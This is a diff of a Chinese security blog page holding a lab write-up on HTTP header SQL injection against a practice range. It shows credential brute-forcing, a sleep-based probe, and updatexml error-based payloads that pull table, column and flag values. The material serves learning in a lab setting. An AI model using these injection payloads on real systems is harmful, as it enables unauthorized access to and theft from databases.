@@ -153,7 +153,7 @@
                         </li>
                         
                         <li>
-                            <a href="/categories/SQL-DDL/">SQL-DDL</a>
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入绕过姿势</a>
                         </li>
                         
                         
@@ -183,11 +183,11 @@
                         </li>
                         
                         <li>
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/">SQL注入--HEAD注入</a>
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
                         </li>
                         
                         <li>
-                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/">SQL注入--HEAD注入</a>
                         </li>
                         
                         
@@ -270,12 +270,25 @@
         </center>
     </div>
     <div class="content-article">
-        <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/m6rqnlsFxx6h.png?imageslim" alt="mark">很明显,获取了请求头中的内容然后进行了insert操作.满足头注入的要求.进行头注入的时候需要正确的账号密码,渗透测试的时候去注册一个即可,这靶场里面的话则需要去爆破了.</p>
-<h1 id="burp过滤出自己想要的内容"><a href="#burp过滤出自己想要的内容" class="headerlink" title="burp过滤出自己想要的内容"></a>burp过滤出自己想要的内容</h1><p>如果页面返回正常和不正常都差不多,那么可以设置过滤条件来帮助查看.<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/UgeuhPdbEibP.png?imageslim" alt="mark"><br>在option选择项里把默认的内容删除了,然后点击add添加自己想要的内容,如果页面返回的内容中匹配到了改内容就会在结果栏中打上勾(注意要用页面正常和不正常之间不同的内容来过滤,<font color="red">尽量使用避免中文</font>)<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/gF9Br0rB65AN.png?imageslim" alt="mark">看,add上传成功后特有的字符串之后匹配到会打上勾.这边就爆破出靶场的账号密码是admin,123456</p>
-<h1 id="判断是否可以头注入"><a href="#判断是否可以头注入" class="headerlink" title="判断是否可以头注入"></a>判断是否可以头注入</h1><p><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/iyWVcFK6a3Mk.png?imageslim" alt="mark">从这句与数据库进行交互的sql语言可以尝试构造sql注入,千万要注意闭合的细节!!!<code>&#39; or sleep(5),1)#</code>返回页面确实延迟了五秒多,说明是存在head注入的.<br>这边遇见一个奇怪的点,我室友burp改user_agent自然是没有问题的,但是使用hackbar插件修改请求头之后却没有反应,再次尝试使用插件修改抓包后发现请求头确实被修改了但是post传的两个参数却没有了</p>
-<h1 id="使用xmlupdate函数爆破表名"><a href="#使用xmlupdate函数爆破表名" class="headerlink" title="使用xmlupdate函数爆破表名"></a>使用xmlupdate函数爆破表名</h1><pre><code>&apos; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)#</code></pre><p><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/I9mpAa0Khv1l.png?imageslim" alt="mark">这里需要注意表名是flag_head,~是concat函数连接上去的</p>
-<h1 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h1><pre><code>&apos; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;flag_head&apos; limit 1,1)),1),1)#</code></pre><p><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/IpdE3wj490xz.png?imageslim" alt="mark"></p>
-<h1 id="爆破值"><a href="#爆破值" class="headerlink" title="爆破值"></a>爆破值</h1><pre><code>&apos; or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)#</code></pre><p><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/0Vup3EGVtjqs.png?imageslim" alt="mark">成功得出flag</p>
+        <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><ul>
+<li><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/m6rqnlsFxx6h.png?imageslim" alt="mark">很明显,获取了请求头中的内容然后进行了insert操作.满足头注入的要求.进行头注入的时候需要正确的账号密码,渗透测试的时候去注册一个即可,这靶场里面的话则需要去爆破了.</li>
+</ul>
+<h1 id="burp过滤出自己想要的内容"><a href="#burp过滤出自己想要的内容" class="headerlink" title="burp过滤出自己想要的内容"></a>burp过滤出自己想要的内容</h1><ul>
+<li>如果页面返回正常和不正常都差不多,那么可以设置过滤条件来帮助查看<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/UgeuhPdbEibP.png?imageslim" alt="mark"><br>在option选择项里把默认的内容删除了,然后点击add添加自己想要的内容,如果页面返回的内容中匹配到了改内容就会在结果栏中打上勾(注意要用页面正常和不正常之间不同的内容来过滤,<font color="red">尽量使用避免中文</font>)<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/gF9Br0rB65AN.png?imageslim" alt="mark">看,add上传成功后特有的字符串之后匹配到会打上勾.这边就爆破出靶场的账号密码是admin,123456</li>
+</ul>
+<h1 id="判断是否可以头注入"><a href="#判断是否可以头注入" class="headerlink" title="判断是否可以头注入"></a>判断是否可以头注入</h1><ul>
+<li><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/iyWVcFK6a3Mk.png?imageslim" alt="mark">从这句与数据库进行交互的sql语言可以尝试构造sql注入,千万要注意闭合的细节!!!<code>&#39; or sleep(5),1)#</code>返回页面确实延迟了五秒多,说明是存在head注入的.<br>这边遇见一个奇怪的点,我室友burp改user_agent自然是没有问题的,但是使用hackbar插件修改请求头之后却没有反应,再次尝试使用插件修改抓包后发现请求头确实被修改了但是post传的两个参数却没有了</li>
+</ul>
+<h1 id="使用xmlupdate函数爆破表名"><a href="#使用xmlupdate函数爆破表名" class="headerlink" title="使用xmlupdate函数爆破表名"></a>使用xmlupdate函数爆破表名</h1><ul>
+<li>‘ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)#</li>
+</ul>
+<p><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/I9mpAa0Khv1l.png?imageslim" alt="mark">这里需要注意表名是flag_head,~是concat函数连接上去的</p>
+<h1 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h1><ul>
+<li>‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag_head’ limit 1,1)),1),1)#<br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/IpdE3wj490xz.png?imageslim" alt="mark"></li>
+</ul>
+<h1 id="爆破值"><a href="#爆破值" class="headerlink" title="爆破值"></a>爆破值</h1><ul>
+<li>‘ or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)#<br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/0Vup3EGVtjqs.png?imageslim" alt="mark">成功得出flag</li>
+</ul>
 <p>另外两个靶场也是差不多的<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/uxd0fUtWK6dw.png?imageslim" alt="mark"><br>这个是获取referer的<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/qYKkLjgATOPe.png?imageslim" alt="mark"><br>这个是获取X-Forwarded=For的基本结构,直接修改就好</p>
 
     </div>
@@ -338,6 +351,36 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2020/04/04/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">宽字节注入--zkaq靶场</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">SQL注入--宽字节注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">SQL注入绕过姿势</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/04/%E7%9B%B2%E6%B3%A8-zkaq%E9%9D%B6%E5%9C%BA/">盲注--zkaq靶场</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/">SQL注入--盲注</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2020/04/04/HEAD%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">HEAD注入--zkaq靶场</a>
                 </span>
             </li>
@@ -366,36 +409,6 @@
                 </span>
             </li>
             
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/03/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8AGet%E6%B3%A8%E5%85%A5/">SQL注入--原理分析以及Get注入</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/03/zkaq-web%E5%AE%89%E5%85%A8%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/">zkaq--web安全前端基础</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/03/web%E6%9C%8D%E5%8A%A1%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/">web服务通信原理</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E7%A9%BA%E5%80%BC%E5%8F%8A%E5%85%B6%E5%A4%84%E7%90%86/">SQL语句--空值及其处理</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E5%AD%90%E6%9F%A5%E8%AF%A2/">SQL语句--子查询</a>
-                </span>
-            </li>
-            
         </ul>
     </div>
 </aside>
@@ -420,7 +433,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/">SQL注入--HEAD注入</a>
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">SQL注入--宽字节注入</a>
                 </span>
             </li>
             
@@ -432,19 +451,19 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E7%A9%BA%E5%80%BC%E5%8F%8A%E5%85%B6%E5%A4%84%E7%90%86/">SQL语句--空值及其处理</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
                     <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E5%AD%90%E6%9F%A5%E8%AF%A2/">SQL语句--子查询</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0/">SQL语句--聚合函数</a>
+                    <a href="/2020/04/03/web%E6%9C%8D%E5%8A%A1%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/">web服务通信原理</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E8%BF%9E%E6%8E%A5%E6%9F%A5%E8%AF%A2/">SQL语句--连接查询</a>
                 </span>
             </li>
             
@@ -456,19 +475,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/02/%E4%BD%BF%E7%94%A8%E4%B8%83%E7%89%9B%E4%BA%91%E6%9D%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87/">使用七牛云来上传图片</a>
+                    <a href="/2020/04/04/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">宽字节注入--zkaq靶场</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/02/%E5%85%B3%E4%BA%8Emarkdown2/">关于markdown2</a>
-                </span>
-            </li>
-            
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/">SQL注入--盲注</a>
                 </span>
             </li>
             
@@ -501,21 +514,25 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/" style="font-size: 8.282386049468986px;" class="tag-cloud-link">SQL注入--Get注入</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/" style="font-size: 13.488823831330269px;" class="tag-cloud-link">SQL注入--Get注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/" style="font-size: 19.60585522982395px;" class="tag-cloud-link">SQL注入--HEAD注入</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" style="font-size: 8.209731068913774px;" class="tag-cloud-link">SQL注入--POST注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" style="font-size: 10.924236982777632px;" class="tag-cloud-link">SQL注入--POST注入</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/" style="font-size: 13.943663684708842px;" class="tag-cloud-link">SQL注入--HEAD注入</a>
     
-    <a href="/tags/SQL-DDL/" style="font-size: 8.002935107211554px;" class="tag-cloud-link">SQL-DDL</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" style="font-size: 15.381596430008912px;" class="tag-cloud-link">SQL注入绕过姿势</a>
     
-    <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/" style="font-size: 14.97503757521483px;" class="tag-cloud-link">web通信原理</a>
+    <a href="/tags/SQL-DDL/" style="font-size: 17.57328981104826px;" class="tag-cloud-link">SQL-DDL</a>
     
-    <a href="/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" style="font-size: 19.737567566703348px;" class="tag-cloud-link">web前端安全基础</a>
+    <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/" style="font-size: 15.21092048589059px;" class="tag-cloud-link">web通信原理</a>
     
-    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/" style="font-size: 9.872476987638018px;" class="tag-cloud-link">博客学习</a>
+    <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15.840344354566824px;" class="tag-cloud-link">序列化与反序列化</a>
     
-    <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 14.581672172909364px;" class="tag-cloud-link">序列化与反序列化</a>
+    <a href="/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" style="font-size: 19.723606254260332px;" class="tag-cloud-link">web前端安全基础</a>
+    
+    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/" style="font-size: 9.582605581392897px;" class="tag-cloud-link">博客学习</a>
+    
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" style="font-size: 12.880931906264317px;" class="tag-cloud-link">SQL注入--盲注</a>
     
 </div>
                 
